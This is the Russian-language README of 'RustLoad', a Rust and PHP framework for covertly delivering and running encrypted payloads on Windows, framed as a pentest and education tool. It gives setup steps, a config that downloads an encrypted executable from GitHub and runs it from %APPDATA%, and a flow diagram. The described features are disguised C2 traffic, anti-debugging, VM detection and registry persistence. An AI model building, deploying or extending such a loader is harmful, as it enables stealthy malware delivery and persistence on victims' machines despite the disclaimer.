# RustLoad

> **Образовательный проект.** Создан в целях изучения техник защиты ПО, обфускации трафика и методов обнаружения отладчиков/виртуальных сред. Используй только в законных целях и только на системах, которыми владеешь или имеешь письменное разрешение на тестирование.

Фреймворк для доставки и защищённого запуска агентов при проведении авторизованных пентестов. Написан на Rust (клиент) + PHP (сервер). Трафик между клиентом и сервером маскируется под статические ресурсы (CSS/JS/изображения), агенты шифруются AES-256-GCM.

---

## ⚠️ Disclaimer

Данный инструмент предназначен **исключительно** для:
- Авторизованного тестирования на проникновение (penetration testing)
- Исследований в области информационной безопасности
- CTF-соревнований
- Образовательных целей

Автор **не несёт ответственности** за любое использование данного инструмента против систем без явного письменного разрешения их владельца. Несанкционированное использование может нарушать законодательство вашей страны.

---

## Особенности

- **Клиент на Rust** — компилируется в один .exe без зависимостей, Windows x64
- **PHP-сервер** — работает на любом хостинге с PHP 8.0+, протестировано на бесплатных
- **Шифрование трафика** — запросы/ответы маскируются под JPEG/CSS/JS
- **AES-256-GCM** — агенты зашифрованы, ключи выводятся через HKDF
- **HMAC-SHA256** аутентификация каждого запроса (защита от replay-атак)
- **Антиотладка** — детект дебаггеров, хардварных брейкпоинтов, виртуальных сред
- **Персистенс** — опционально, через реестр Windows

---

## Структура

```
├── backend/                     # PHP C2-сервер
│   ├── config/
│   │   ├── .env.example         # Шаблон конфига (скопируй в .env)
│   │   └── deployments.php      # Список агентов
│   ├── core/                    # Логика: крипто, безопасность, логи
│   └── public/
│       └── api.php              # Точка входа
│
├── loader/                      # Rust клиент
│   └── src/
│
├── configs/
│   └── deployment.toml.example  # Шаблон конфига клиента (скопируй в deployment.toml)
│
└── tools/
    └── encrypt_payload.py       # Шифрование агентов перед деплоем
```

---

## Требования

| Компонент | Требование |
|-----------|-----------|
| PHP (сервер) | 8.0+, расширения: `openssl`, `hash`, `json` |
| Rust (сборка клиента) | stable, [rustup.rs](https://rustup.rs) |
| Windows SDK | для winapi (нужен при сборке) |
| Python | 3.8+, пакет `cryptography` |
| Целевая ОС | Windows 10/11 x64 |

---

## Установка и настройка

### 1. Бэкенд

```bash
cp backend/config/.env.example backend/config/.env
# Открываешь .env и заполняешь SECRET_KEY и MASTER_KEY
# Генерация ключей: python -c "import secrets; print(secrets.token_hex(32))"
```

Загружаешь папку `backend/` на хостинг. Проверяешь что `api.php` отвечает по URL.

---

### 2. Шифрование агента

```bash
pip install cryptography

# Windows
set MASTER_KEY=ключ_из_.env
python tools/encrypt_payload.py agent.exe agent.enc --profile my_profile --name agent

# Linux/Mac
MASTER_KEY=ключ_из_.env python tools/encrypt_payload.py agent.exe agent.enc --profile my_profile --name agent
```

Скрипт выдаст SHA256 и готовый блок для `deployments.php`.

---

### 3. Конфиг deployments.php

```php
return [
    'my_profile' => [
        [
            'name'     => 'agent',
            'url'      => 'https://github.com/user/repo/releases/download/v1/agent.enc',
            'sha256'   => 'хэш_из_скрипта',
            'target'   => '%APPDATA%\\Client\\agent.exe',
            'run'      => true,
            'elevated' => false
        ],
    ],
];
```

---

### 4. Сборка клиента

```bash
cp configs/deployment.toml.example configs/deployment.toml
# Заполняешь api_url, profile, api_secret

cd loader
cargo build --release
# Готовый бинарник: loader/target/release/loader.exe
```

---

## Схема работы

```
client.exe
  ├─ антиотладка / детект VM (опционально)
  ├─ персистенс (опционально)
  └─ POST /api.php?f=css   ← выглядит как CSS-запрос
            │  HMAC-подпись
            ▼
       PHP сервер
            │  проверяет подпись + rate limit
            │  выдаёт ключ: HKDF(master_key, profile|name)
            ▼
       клиент качает .enc с CDN/GitHub
            └─ AES-256-GCM расшифровка → запуск
```

---

## Заметки

- При тестировании на VM детект сработает и клиент закроется — закомментируй `anti_analysis::enforce` в `main.rs`
- `elevated: true` вызовет UAC-промпт (системный диалог Windows, не скрывается)
- Смена `MASTER_KEY` делает все ранее зашифрованные файлы нерабочими
- Если что-то не работает — раскомментируй `dbg_log` в `main.rs`, лог пишется в `%TEMP%\dbg.txt`

---

## License

MIT — используй свободно, на свой страх и риск.
